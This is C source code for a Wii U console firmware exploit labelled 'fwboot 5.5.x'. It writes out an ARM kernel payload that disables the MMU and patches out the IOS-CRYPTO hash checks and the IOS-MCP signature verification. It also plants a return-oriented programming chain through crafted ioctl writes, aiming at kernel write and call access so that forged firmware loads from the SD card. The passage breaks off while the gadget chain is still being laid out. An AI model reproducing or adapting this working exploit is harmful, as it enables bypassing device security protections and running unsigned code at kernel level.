#include "loader.h"

// Helper functions
void render(char *str_buf);

// Main functions
void exploit(int argc, void *argv[]);
void ioctl_21(uint32_t write_addr, uint32_t write_data, uint32_t *in_buf, uint32_t *out_buf);
// void ioctl_20(uint32_t write_addr);
void do_rop(uint32_t *data_buf, uint32_t *in_buf, uint32_t *out_buf);

void _start()
{
	// Load a good stack
	asm(
		"lis %r1, 0x1ab5 ;"
		"ori %r1, %r1, 0xd138 ;"
	);

	// Get a handle to coreinit.rpl and sysapp.rpl
	unsigned int coreinit_handle, sysapp_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
	OSDynLoad_Acquire("sysapp.rpl", &sysapp_handle);

	// Exit functions
	void (*_Exit)();
	OSDynLoad_FindExport(coreinit_handle, 0, "_Exit", &_Exit);

	// Memory functions
	void*(*memcpy)(void *dest, void *src, uint32_t length);
	void*(*memset)(void *dest, uint32_t value, uint32_t bytes);
	void* (*OSAllocFromSystem)(uint32_t size, int align);
	void (*OSFreeToSystem)(void *ptr);
	OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
	OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSAllocFromSystem", &OSAllocFromSystem);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSFreeToSystem", &OSFreeToSystem);
	
	// IM functions
	int(*IM_SetDeviceState)(int fd, void *mem, int state, int a, int b);
	int(*IM_Close)(int fd);
	int(*IM_Open)();
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_SetDeviceState", &IM_SetDeviceState);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Close", &IM_Close);
	OSDynLoad_FindExport(coreinit_handle, 0, "IM_Open", &IM_Open);
	
	// OSScreen functions
	void(*OSScreenInit)();
	unsigned int(*OSScreenGetBufferSizeEx)(unsigned int bufferNum);
	unsigned int(*OSScreenSetBufferEx)(unsigned int bufferNum, void * addr);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenInit", &OSScreenInit);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenGetBufferSizeEx", &OSScreenGetBufferSizeEx);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSScreenSetBufferEx", &OSScreenSetBufferEx);
	
	// OS thread functions
	bool (*OSCreateThread)(void *thread, void *entry, int argc, void *args, uint32_t *stack, uint32_t stack_size, int priority, uint16_t attr);
	int (*OSResumeThread)(void *thread);
	int (*OSIsThreadTerminated)(void *thread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSCreateThread", &OSCreateThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSResumeThread", &OSResumeThread);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSIsThreadTerminated", &OSIsThreadTerminated);
	
	// OS misc functions
	void (*OSForceFullRelaunch)();
	OSDynLoad_FindExport(coreinit_handle, 0, "OSForceFullRelaunch", &OSForceFullRelaunch);
	
	// SYSAPP functions
	void (*SYSLaunchMenu)();
	OSDynLoad_FindExport(sysapp_handle, 0, "SYSLaunchMenu", &SYSLaunchMenu);
	
	// Force a full application relaunch after _Exit
	OSForceFullRelaunch();
	
	// Open menu after _Exit
	// This will force IOS-MCP to load our forged fw.img right away
	SYSLaunchMenu();
	
	// Restart system to get lib access
	int fd = IM_Open();
	void *mem = OSAllocFromSystem(0x100, 64);
	memset(mem, 0, 0x100);
	
	// Set restart flag to force quit browser
	IM_SetDeviceState(fd, mem, 3, 0, 0); 
	IM_Close(fd);
	OSFreeToSystem(mem);
	
	// Wait a bit for browser end
	unsigned int t1 = 0x1FFFFFFF;
	while(t1--);
	
	// Call the screen initilzation function
	OSScreenInit();
	
	// Grab the buffer size for each screen (TV and gamepad)
	int buf0_size = OSScreenGetBufferSizeEx(0);
	int buf1_size = OSScreenGetBufferSizeEx(1);
	
	// Set the buffer area
	OSScreenSetBufferEx(0, (void *)0xF4000000);
	OSScreenSetBufferEx(1, (void *)0xF4000000 + buf0_size);
	
	// Clear both framebuffers
	for (int i = 0; i < 2; i++)
	{
		fillScreen(0,0,0,0);
		flipBuffers();
	}
	
	// Allocate in/out buffers
	uint32_t *in_buf = (uint32_t*)OSAllocFromSystem(0x100, 0x04);
	uint32_t *out_buf = (uint32_t*)OSAllocFromSystem(0x1000, 0x04);
	memset(in_buf, 0, 0x100);
	memset(out_buf, 0, 0x1000);
	
	// Allocate a data buffer
	uint32_t *data_buf = (uint32_t*)OSAllocFromSystem(0x4000, 0x04);
	memset(data_buf, 0xFF, 0x4000);
	
	// Allocate a buffer for new thread's parameters
	uint32_t *param_buf = (uint32_t*)OSAllocFromSystem(0x10, 0x04);
	memset(param_buf, 0, 0x10);
	
	// Pass along the input, output and data buffers
	param_buf[0] = (uint32_t)in_buf;
	param_buf[1] = (uint32_t)out_buf;
	param_buf[2] = (uint32_t)data_buf;
	
	// Make a new thread to run the exploit
	OSContext *thread = (OSContext*)OSAllocFromSystem(0x1000, 0x08);
	uint32_t *stack = (uint32_t*)OSAllocFromSystem(0x2000, 0x20);
	if (!OSCreateThread(thread, &exploit, 3, param_buf, stack + 0x2000, 0x2000, 0, 0x02 | 0x08)) OSFatal("Failed to create thread");
	OSResumeThread(thread);
	
	// Keep the current thread waiting
	while(OSIsThreadTerminated(thread) == 0)
    {
        asm volatile (
        "    nop\n"
        "    nop\n"
        "    nop\n"
        "    nop\n"
        "    nop\n"
        "    nop\n"
        "    nop\n"
        "    nop\n"
        );
	}
	
	// Exit
	_Exit();
}

// Main exploit thread
void exploit(int argc, void *argv[])
{
	// Get a handle to coreinit.rpl
	unsigned int coreinit_handle;
	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
		
	// Memory functions
	uint32_t (*OSEffectiveToPhysical)(void *vaddr);
	OSDynLoad_FindExport(coreinit_handle, 0, "OSEffectiveToPhysical", &OSEffectiveToPhysical);
	
	// Fetch the parameters
	uint32_t *in_buf = argv[0];
	uint32_t *out_buf = argv[1];
	uint32_t *data_buf = argv[2];
	
	/* 
		Kernel payload
	*/
	// Save LR
	data_buf[0x00/4] = 0xE1A0900E;		// MOV    R9, LR
	
	// Save arg0
	data_buf[0x04/4] = 0xE1A07000;		// MOV    R7, R0
	
	// Disable interrupts
	data_buf[0x08/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x0C/4] = 0xE12FFF33;		// BLX    R3
	
	// Save interrupt state
	data_buf[0x10/4] = 0xE1A08000;		// MOV    R8, R0
	
	// Disable MMU
	data_buf[0x14/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x18/4] = 0xE12FFF33;		// BLX    R3

	// Load IOS-CRYPTO H0 hash check address
	data_buf[0x1C/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load H0 patch
	data_buf[0x20/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	
	// Patch H0
	data_buf[0x24/4] = 0xE5834000;		// STR    R4, [R3]
	
	// Load IOS-CRYPTO H1 hash check address
	data_buf[0x28/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load H1 patch
	data_buf[0x2C/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	
	// Patch H1
	data_buf[0x30/4] = 0xE5834000;		// STR    R4, [R3]
	
	// Load IOS-CRYPTO H2 hash check address
	data_buf[0x34/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load H2 patch
	data_buf[0x38/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	
	// Patch H2
	data_buf[0x3C/4] = 0xE5834000;		// STR    R4, [R3]
	
	// Load IOS-CRYPTO H3 hash check address
	data_buf[0x40/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load H3 patch
	data_buf[0x44/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	
	// Patch H3
	data_buf[0x48/4] = 0xE5834000;		// STR    R4, [R3]
	
	// Load IOS-MCP title string address
	data_buf[0x4C/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load "/vol/sdcard"
	data_buf[0x50/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0x54/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	data_buf[0x58/4] = 0xE59F61F8;		// LDR    R6, [PC,#0x200]
	
	// Overwrite title string in IOS-MCP
	data_buf[0x5C/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0x60/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	data_buf[0x64/4] = 0xE5836008;		// STR    R6, [R3,#0x08]
	
	// Load IOS-MCP sign verify crypto call address
	data_buf[0x68/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load patch code
	data_buf[0x6C/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0x70/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	
	// Patch call to IOS-CRYPTO sign verify
	data_buf[0x74/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0x78/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	
	// Load IOS-MCP sdcard mount hook address
	data_buf[0x7C/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load hook code (#1)
	data_buf[0x80/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0x84/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	data_buf[0x88/4] = 0xE59F61F8;		// LDR    R6, [PC,#0x200]
	
	// Write hook code (#1)
	data_buf[0x8C/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0x90/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	data_buf[0x94/4] = 0xE5836008;		// STR    R6, [R3,#0x08]
	
	// Move address
	data_buf[0x98/4] = 0xE283300C;		// ADD    R3, R3, #0x0C
	
	// Load hook code (#2)
	data_buf[0x9C/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0xA0/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	data_buf[0xA4/4] = 0xE59F61F8;		// LDR    R6, [PC,#0x200]
	
	// Write hook code (#2)
	data_buf[0xA8/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0xAC/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	data_buf[0xB0/4] = 0xE5836008;		// STR    R6, [R3,#0x08]
	
	// Move address
	data_buf[0xB4/4] = 0xE283300C;		// ADD    R3, R3, #0x0C
	
	// Load hook code (#3)
	data_buf[0xB8/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0xBC/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	data_buf[0xC0/4] = 0xE59F61F8;		// LDR    R6, [PC,#0x200]
	
	// Write hook code (#3)
	data_buf[0xC4/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0xC8/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	data_buf[0xCC/4] = 0xE5836008;		// STR    R6, [R3,#0x08]
	
	// Move address
	data_buf[0xD0/4] = 0xE283300C;		// ADD    R3, R3, #0x0C
	
	// Load hook code (#4)
	data_buf[0xD4/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0xD8/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	data_buf[0xDC/4] = 0xE59F61F8;		// LDR    R6, [PC,#0x200]
	
	// Write hook code (#4)
	data_buf[0xE0/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0xE4/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	data_buf[0xE8/4] = 0xE5836008;		// STR    R6, [R3,#0x08]
	
	// Move address
	data_buf[0xEC/4] = 0xE283300C;		// ADD    R3, R3, #0x0C
	
	// Load hook data
	data_buf[0xF0/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0xF4/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	
	// Write hook data
	data_buf[0xF8/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0xFC/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	
	// Load IOS-MCP sdcard mount jump address
	data_buf[0x100/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load patch code
	data_buf[0x104/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0x108/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	
	// Patch unused SVC call to jump to sdcard mount hook
	data_buf[0x10C/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0x110/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	
	// Load IOS-MCP OS load printf call address
	data_buf[0x114/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	
	// Load printf call patch
	data_buf[0x118/4] = 0xE59F41F8;		// LDR    R4, [PC,#0x200]
	data_buf[0x11C/4] = 0xE59F51F8;		// LDR    R5, [PC,#0x200]
	
	// Patch IOS-MCP OS load printf call
	data_buf[0x120/4] = 0xE5834000;		// STR    R4, [R3]
	data_buf[0x124/4] = 0xE5835004;		// STR    R5, [R3,#0x04]
	
	// Enable MMU
	data_buf[0x128/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x12C/4] = 0xE12FFF33;		// BLX    R3
	
	// Test and clean data cache
	data_buf[0x130/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x134/4] = 0xE12FFF33;		// BLX    R3
	
	// Drain write buffer
	data_buf[0x138/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x13C/4] = 0xE12FFF33;		// BLX    R3
	
	// Invalidate instruction cache
	data_buf[0x140/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x144/4] = 0xE12FFF33;		// BLX    R3
	
	// Load interrupt state
	data_buf[0x148/4] = 0xE1A00008;		// MOV    R0, R8
	
	// Enable interrupts
	data_buf[0x14C/4] = 0xE59F31F8;		// LDR    R3, [PC,#0x200]
	data_buf[0x150/4] = 0xE12FFF33;		// BLX    R3
	
	// Load LR
	data_buf[0x154/4] = 0xE1A0E009;		// MOV    LR, R9
	
	// Return
	data_buf[0x158/4] = 0xE12FFF1E;		// BX     LR
	
	// Data region
	data_buf[0x208/4] = 0x0812E778;					// Disable interrupts function
	data_buf[0x214/4] = 0x0812EA6C;					// Disable MMU function
	
	data_buf[0x21C/4] = 0x08280000 + 0x000017E0;	// IOS-CRYPTO H0 hash check address
	data_buf[0x220/4] = 0xE3A00000;					// MOV    R0, #0
	data_buf[0x228/4] = 0x08280000 + 0x000019C4;	// IOS-CRYPTO H1 hash check address
	data_buf[0x22C/4] = 0xE3A00000;					// MOV    R0, #0
	data_buf[0x234/4] = 0x08280000 + 0x00001BB0;	// IOS-CRYPTO H2 hash check address
	data_buf[0x238/4] = 0xE3A00000;					// MOV    R0, #0
	data_buf[0x240/4] = 0x08280000 + 0x00001D40;	// IOS-CRYPTO H3 hash check address
	data_buf[0x244/4] = 0xE3A00000;					// MOV    R0, #0
	
	data_buf[0x24C/4] = 0x081C0000 + 0x000663B4;	// IOS-MCP title path string address
	data_buf[0x250/4] = 0x2F766F6C;					// "/vol"
	data_buf[0x254/4] = 0x2F736463;					// "/sdc"
	data_buf[0x258/4] = 0x61726400;					// "ard"
	
	data_buf[0x268/4] = 0x081C0000 + 0x00052C44;	// IOS-MCP sign verify crypto call address
	data_buf[0x26C/4] = 0xE3A00000;					// MOV    R0, #0
	data_buf[0x270/4] = 0xE12FFF1E;					// BX    LR
	
	data_buf[0x27C/4] = 0x081C0000 + 0x00052C50;	// IOS-MCP sdcard mount hook address
	data_buf[0x280/4] = 0xE92D400F;					// STMFD    SP!, {R0-R3,LR}
	data_buf[0x284/4] = 0xE24DD008;					// SUB      SP, SP, #0x8
	data_buf[0x288/4] = 0xE3A00000;					// MOV    	R0, #0
	data_buf[0x29C/4] = 0xEB00193F;					// BL     	sub_05059160	(FSA_Open)
	data_buf[0x2A0/4] = 0xE59F1018;					// LDR    	R1, [PC,#0x20]
	data_buf[0x2A4/4] = 0xE59F2018;					// LDR    	R2, [PC,#0x20]
	data_buf[0x2B8/4] = 0xE3A03000;					// MOV    	R3, #0
	data_buf[0x2BC/4] = 0xE58D3000;					// STR      R3, [SP]
	data_buf[0x2C0/4] = 0xE58D3004;					// STR      R3, [SP,#0x04]
	data_buf[0x2D4/4] = 0xEB001A2D;					// BL     	sub_05059530	(FSA_Mount)
	data_buf[0x2D8/4] = 0xE28DD008;					// ADD      SP, SP, #0x8
	data_buf[0x2DC/4] = 0xE8BD800F;					// LDMFD    SP!, {R0-R3,PC}
	data_buf[0x2F0/4] = 0x050646C8;					// Virtual pointer to "/dev/sdcard01"
	data_buf[0x2F4/4] = 0x050663B4;					// Virtual pointer to "/vol/sdcard"
	
	data_buf[0x300/4] = 0x081C0000 + 0x000565F0;	// IOS-MCP sdcard mount jump address (trash unused SVC)
	data_buf[0x304/4] = 0x477846C0;					// BX PC + NOP (switch from THUMB to ARM)
	data_buf[0x308/4] = 0xEAFFF195;					// Jump from 0x050565F4 to 0x05052C50 (inside patched crypto call)
	
	data_buf[0x314/4] = 0x081C0000 + 0x000282AC;	// IOS-MCP OS load printf call address (aligned)
	data_buf[0x318/4] = 0x00A4F02E;					// Old code + BL  sub_050565F0 (THUMB)
	data_buf[0x31C/4] = 0xF99F193B;					// Old code + BL  sub_050565F0 (THUMB)	
	
	data_buf[0x328/4] = 0x0812EA5C;					// Enable MMU function
	data_buf[0x330/4] = 0x0812DCE4;					// Test and clean data cache function
	data_buf[0x338/4] = 0x0812DCFC;					// Drain write buffer function
	data_buf[0x340/4] = 0x0812DCF0;					// Invalidate instruction cache function
	data_buf[0x34C/4] = 0x0812E78C;					// Enable interrupts function

	/* 
		Kernel patch
	*/
	data_buf[0x1000/4] = 0xE5921054;
	data_buf[0x1004/4] = 0xE3510000;
	data_buf[0x1008/4] = 0x1AFFFF5F;
	data_buf[0x100C/4] = 0xE3A00A01;
	data_buf[0x1010/4] = 0xEBFFFEAC;
	data_buf[0x1014/4] = 0xE1A04000;
	data_buf[0x1018/4] = 0xEAFFFF52;
	data_buf[0x101C/4] = 0xE3A00020;
	data_buf[0x1020/4] = 0xEBFFFEA8;
	data_buf[0x1024/4] = 0xE1A04000;
	data_buf[0x1028/4] = 0xEAFFFF4E;
	data_buf[0x102C/4] = 0xE3A00040;
	data_buf[0x1030/4] = 0xEBFFFEA4;
	data_buf[0x1034/4] = 0xE1A04000;
	data_buf[0x1038/4] = 0xEAFFFF4A;
	data_buf[0x103C/4] = 0xE3A00002;
	data_buf[0x1040/4] = 0xEBFFFEB7;
	data_buf[0x1044/4] = 0xE1A04000;
	data_buf[0x1048/4] = 0xEAFFFF46;
	data_buf[0x104C/4] = 0xE3A00004;
	data_buf[0x1050/4] = 0xEBFFFE9C;
	data_buf[0x1054/4] = 0xE1A04000;
	data_buf[0x1058/4] = 0xEAFFFF42;
	data_buf[0x105C/4] = 0x08173BA0;
	
	// Trigger the ROP chain
	do_rop((uint32_t *)OSEffectiveToPhysical((void *)data_buf), in_buf, out_buf);
		
	// Text buffer
	char str_buf[0x400];

	// Wait for a while
	for (int i = 0; i < 0x100; i++)
	{
		__os_snprintf(str_buf, 0x400, "****fwboot 5.5.x****\nWaiting: 0x%08x", i);
		render(str_buf);	
	}

	return;
}

// Plant and launch our ROP chain
void do_rop(uint32_t *data_buf, uint32_t *in_buf, uint32_t *out_buf)
{
	/*
		
		Globals
		
	*/
	
	uint32_t uhs_heap_addr = 0x10146060;
	uint32_t uhs_rop_chain_addr = 0x10246060;
	
	/*
	
		Store parameters for IOS_CreateThread ROP chain
	
	*/

	// IOS_CreateThread(0, 0, 0x0812097C, 0x68, 0x64, 0x02)
	uint32_t syscall_addr = 0x1012EABC;
	uint32_t thread_entry = 0x00000000;
	uint32_t thread_args = 0x00000000;
	uint32_t thread_stack_addr = 0x0812097C;
	uint32_t thread_stack_size = 0x68;
	uint32_t thread_priority = 0x64;
	uint32_t thread_flags = 0x02;
	
	// Next PC for gadget #2
	ioctl_21(0x104C0000 + 0x00, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x04, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x08, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x0C, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x10, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x14, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x18, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x1C, 0x101034C8, in_buf, out_buf);
	ioctl_21(0x104C0000 + 0x20, 0x101034C8, in_buf, out_buf);
	
	// R3 for gadget #3 (thread_stack_size)
	ioctl_21(0x104C0100 + 0x00, thread_stack_size, in_buf, out_buf);
	ioctl_21(0x104C0100 + 0x04, thread_stack_size, in_buf, out_buf);
	ioctl_21(0x104C0100 + 0x08, thread_stack_size, in_buf, out_buf);
	ioctl_21(0x104C0100 + 0x0C, thread_stack_size, in_buf, out_buf);
	ioctl_21(0x104C0100 + 0x10, thread_stack_size, in_buf, out_buf);
	
	// R0 for gadget #4 (thread_entry)
	ioctl_21(0x104C0200 + 0x00, thread_entry, in_buf, out_buf);
	ioctl_21(0x104C0200 + 0x04, thread_entry, in_buf, out_buf);
	ioctl_21(0x104C0200 + 0x08, thread_entry, in_buf, out_buf);
	ioctl_21(0x104C0200 + 0x0C, thread_entry, in_buf, out_buf);
	ioctl_21(0x104C0200 + 0x10, thread_entry, in_buf, out_buf);
	ioctl_21(0x104C0200 + 0x14, thread_entry, in_buf, out_buf);
	
	// Next PC for gadget #4 (syscall_addr)
	ioctl_21(0x104C0300 + 0x24, syscall_addr, in_buf, out_buf);
	ioctl_21(0x104C0300 + 0x28, syscall_addr, in_buf, out_buf);	
	
	/*
	
		Store parameters for kern_write SP check patch ROP chain
	
	*/
	
	uint32_t kern_write_addr = 0x1012EE2C;
	
	uint32_t kern_write_spcp_data = 0xEAFFFFDA;
	uint32_t kern_write_spcp_target = 0x0812DE58;
	
	// R2 for gadget #7 (kern_write_spcp_target)
	ioctl_21(0x104C0500 + 0x24, kern_write_spcp_target, in_buf, out_buf);
	ioctl_21(0x104C0500 + 0x28, kern_write_spcp_target, in_buf, out_buf);
	
	// Next PC for gadget #8 (kern_write_addr)
	ioctl_21(0x104C0600 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C0600 + 0x28, kern_write_addr, in_buf, out_buf);	
	
	/*
	
		Store parameters for kern_write SP move patch ROP chain
	
	*/
	
	uint32_t kern_write_spmov_data = uhs_rop_chain_addr;
	uint32_t kern_write_spmov_target = (0xFFFF4D78 + 0xA4 + (0xC8 * 0x3C));
	
	// R2 for gadget #9 (kern_write target)
	ioctl_21(0x104C0800 + 0x24, kern_write_spmov_target, in_buf, out_buf);
	ioctl_21(0x104C0800 + 0x28, kern_write_spmov_target, in_buf, out_buf);
	
	// Next PC for gadget #10 (kern_write_addr)
	ioctl_21(0x104C0900 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C0900 + 0x28, kern_write_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_write iosPanic patch ROP chain
	
	*/
	
	uint32_t kern_write_panic_data = 0xE12FFF1E;
	uint32_t kern_write_panic_target = 0x08129A24;
	
	// R2 for gadget #11 (kern_write_panic_target)
	ioctl_21(0x104C0B00 + 0x24, kern_write_panic_target, in_buf, out_buf);
	ioctl_21(0x104C0B00 + 0x28, kern_write_panic_target, in_buf, out_buf);
	
	// Next PC for gadget #12 (kern_write_addr)
	ioctl_21(0x104C0C00 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C0C00 + 0x28, kern_write_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_write install ROP chain
	
	*/
	
	uint32_t kern_write_inst_data = 0x08131D04;
	uint32_t kern_write_inst_target = 0x08141BF4;
	
	// R2 for gadget #13 (kern_write_inst_target)
	ioctl_21(0x104C0E00 + 0x24, kern_write_inst_target, in_buf, out_buf);
	ioctl_21(0x104C0E00 + 0x28, kern_write_inst_target, in_buf, out_buf);
	
	// Next PC for gadget #14 (kern_write_addr)
	ioctl_21(0x104C0F00 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C0F00 + 0x28, kern_write_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_memcpy patch ROP chain
	
	*/
	
	uint32_t kern_memcpy_addr = 0x1012EEC4;
	uint32_t kern_memcpy_patch_src = (uint32_t)data_buf + 0x1000;
	uint32_t kern_memcpy_patch_dst = 0x08120910;
	uint32_t kern_memcpy_patch_size = 0x00000060;
	
	// R0 for gadget #15 (kern_memcpy_patch_dst)
	ioctl_21(0x104C1300 + 0x00, kern_memcpy_patch_dst, in_buf, out_buf);
	ioctl_21(0x104C1300 + 0x04, kern_memcpy_patch_dst, in_buf, out_buf);
	
	// R2 for gadget #16 (kern_memcpy_patch_size)
	ioctl_21(0x104C1100 + 0x24, kern_memcpy_patch_size, in_buf, out_buf);
	ioctl_21(0x104C1100 + 0x28, kern_memcpy_patch_size, in_buf, out_buf);
	
	// Next PC for gadget #16 (kern_memcpy_addr)
	ioctl_21(0x104C1200 + 0x24, kern_memcpy_addr, in_buf, out_buf);
	ioctl_21(0x104C1200 + 0x28, kern_memcpy_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_memcpy payload ROP chain
	
	*/
	
	uint32_t kern_memcpy_payload_src = (uint32_t)data_buf;
	uint32_t kern_memcpy_payload_dst = 0x08134010;
	uint32_t kern_memcpy_payload_size = 0x00000400;
	
	// R0 for gadget #17 (kern_memcpy_payload_dst)
	ioctl_21(0x104C1600 + 0x00, kern_memcpy_payload_dst, in_buf, out_buf);
	ioctl_21(0x104C1600 + 0x04, kern_memcpy_payload_dst, in_buf, out_buf);
	
	// R2 for gadget #18 (kern_memcpy_payload_size)
	ioctl_21(0x104C1400 + 0x24, kern_memcpy_payload_size, in_buf, out_buf);
	ioctl_21(0x104C1400 + 0x28, kern_memcpy_payload_size, in_buf, out_buf);
	
	// Next PC for gadget #18 (kern_memcpy_addr)
	ioctl_21(0x104C1500 + 0x24, kern_memcpy_addr, in_buf, out_buf);
	ioctl_21(0x104C1500 + 0x28, kern_memcpy_addr, in_buf, out_buf);
	
	
	/*
	
		Store parameters for kern_write call ROP chain
	
	*/
	
	uint32_t kern_write_call_data = 0x08134010;
	uint32_t kern_write_call_target = 0x08141BAC;
	
	// R2 for gadget #19 (kern_write_call_target)
	ioctl_21(0x104C1700 + 0x24, kern_write_call_target, in_buf, out_buf);
	ioctl_21(0x104C1700 + 0x28, kern_write_call_target, in_buf, out_buf);
	
	// Next PC for gadget #20 (kern_write_addr)
	ioctl_21(0x104C1800 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C1800 + 0x28, kern_write_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_call ROP chain
	
	*/
	
	uint32_t kern_call = 0x1012EE34;
	uint32_t kern_call_arg0 = (uint32_t)data_buf;
	uint32_t kern_call_arg1 = 0x00000000;
	uint32_t kern_call_arg2 = 0x00000000;
	
	// R0 for gadget #21 (kern_call_arg0)
	ioctl_21(0x104C1C00 + 0x00, kern_call_arg0, in_buf, out_buf);
	ioctl_21(0x104C1C00 + 0x04, kern_call_arg0, in_buf, out_buf);
	
	// R2 for gadget #22 (kern_call_arg2)
	ioctl_21(0x104C1A00 + 0x24, kern_call_arg2, in_buf, out_buf);
	ioctl_21(0x104C1A00 + 0x28, kern_call_arg2, in_buf, out_buf);
	
	// Next PC for gadget #22 (kern_memcpy_addr)
	ioctl_21(0x104C1B00 + 0x24, kern_call, in_buf, out_buf);
	ioctl_21(0x104C1B00 + 0x28, kern_call, in_buf, out_buf);
	
	
	/*
	
		Store parameters for kern_write LR patch ROP chain
	
	*/
	
	uint32_t kern_write_lrp_data = 0x101112D8;
	uint32_t kern_write_lrp_target = uhs_heap_addr + 0x24CE0;
	
	// R2 for gadget #23 (kern_write_lrp_target)
	ioctl_21(0x104C1D00 + 0x24, kern_write_lrp_target, in_buf, out_buf);
	ioctl_21(0x104C1D00 + 0x28, kern_write_lrp_target, in_buf, out_buf);
	
	// Next PC for gadget #24 (kern_write_addr)
	ioctl_21(0x104C1E00 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C1E00 + 0x28, kern_write_addr, in_buf, out_buf);
	
	/*
	
		Store parameters for kern_write SP patch ROP chain
	
	*/
	
	uint32_t kern_write_spp_data = uhs_heap_addr + 0x24CD4;
	uint32_t kern_write_spp_target = (0xFFFF4D78 + 0xA4 + (0xC8 * 0x3C));
	
	// R2 for gadget #25 (kern_write target)
	ioctl_21(0x104C2000 + 0x24, kern_write_spp_target, in_buf, out_buf);
	ioctl_21(0x104C2000 + 0x28, kern_write_spp_target, in_buf, out_buf);
	
	// Next PC for gadget #26 (kern_write_addr)
	ioctl_21(0x104C2100 + 0x24, kern_write_addr, in_buf, out_buf);
	ioctl_21(0x104C2100 + 0x28, kern_write_addr, in_buf, out_buf);
	
	
	/*
	
		Call IOS_CreateThread()
		This will patch kernel syscall 0x6E and turn it into kern_write (STR  R1, [R2])
	
	*/
	
	
	// Gadget #1
	/*
		LOAD:1010EFA0                 ADD             SP, SP, #0x2C
		LOAD:1010EFA4                 LDMFD           SP!, {R4-R8,PC}
	*/
	
	ioctl_21(uhs_heap_addr + 0x24D14, 0xDEADC0DE, in_buf, out_buf);						// R4
